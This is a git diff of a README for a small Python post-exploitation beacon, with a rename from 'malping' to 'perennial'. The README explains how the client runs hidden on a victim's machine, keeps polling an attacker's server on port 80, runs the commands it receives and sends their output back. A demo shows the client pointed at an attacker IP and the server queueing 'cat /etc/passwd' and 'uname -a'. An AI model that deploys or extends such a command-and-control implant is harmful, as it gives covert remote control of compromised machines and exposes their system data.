@@ -1,16 +1,16 @@
-# malping
+# perennial
 
 A simple implementation of a post-exploitation beacon.
 
 ## overview
 
-`malping.py` is the script that runs on the victim machine, theoretically
+`client.py` is the script that runs on the victim machine, theoretically
 hidden or obscured in some way. Based on arguments, it sends a ping of sorts
-to a specified ip (attacker) at a desired frequency, where `mp_server.py` may
-or may not be running. As soon as `mp_server.py` is executed on the attacker's
-machine, `malping.py` will be able to connect to the server and essentially ask
-for a command to execute, based on arguments passed to `mp_server.py`.
-`malping.py` will obediently execute the command and send the stdout back to
+to a specified ip (attacker) at a desired frequency, where `server.py` may
+or may not be running. As soon as `server.py` is executed on the attacker's
+machine, `client.py` will be able to connect to the server and essentially ask
+for a command to execute, based on arguments passed to `server.py`.
+`client.py` will obediently execute the command and send the stdout back to
 the server.
 
 The server runs on port 80 of the attacker's machine by default and since that
@@ -20,18 +20,18 @@ be able to connect back.
 ## demo
 
 The attacker has gotten access to the victim's machine and downloaded and
-executed malping. He/she does not have the server running at this point,
-but it's ok, malping waits patiently. Eventually the attacker is ready and
-starts the server, telling malping to execute the commands, "cat /etc/passwd"
-and "uname -a". The next time malping pings the server it sees the commands
+executed perennial. He/she does not have the server running at this point,
+but it's ok, perennial waits patiently. Eventually the attacker is ready and
+starts the server, telling perennial to execute the commands, "cat /etc/passwd"
+and "uname -a". The next time perennial pings the server it sees the commands
 queued to be executed and does so, one at a time. When all the commands have
-been executed, the server stops, but malping keeps listening.
+been executed, the server stops, but perennial keeps listening.
 
 Victim's Machine (5.4.3.2):
 
 ```
-$ ./malping.py 1.2.3.4 5
-[+] Malping started with delay of 5 seconds to port 80. Ctrl-c to exit.
+$ ./client.py 1.2.3.4 5
+[+] Perennial started with delay of 5 seconds to port 80. Ctrl-c to exit.
 [!] (2014-05-07 21:52:29.475144) Could not connect to server. Waiting...
 [!] (2014-05-07 21:52:34.475740) Could not connect to server. Waiting...
 [!] (2014-05-07 21:52:39.475874) Could not connect to server. Waiting...
@@ -47,8 +47,8 @@ $ ./malping.py 1.2.3.4 5
 Attacker's Machine (1.2.3.4):
 
 ```
-$ sudo ./mp_server.py "cat /etc/passwd" "uname -a"
-[+] Malping server started on 80.
+$ sudo ./server.py "cat /etc/passwd" "uname -a"
+[+] Perennial server started on 80.
 [i] Connected By: ('5.4.3.2', 52252) at 2014-05-07 21:52:54.480167
 [+] Sending Command: cat /etc/passwd
 [+] Command Stdout:
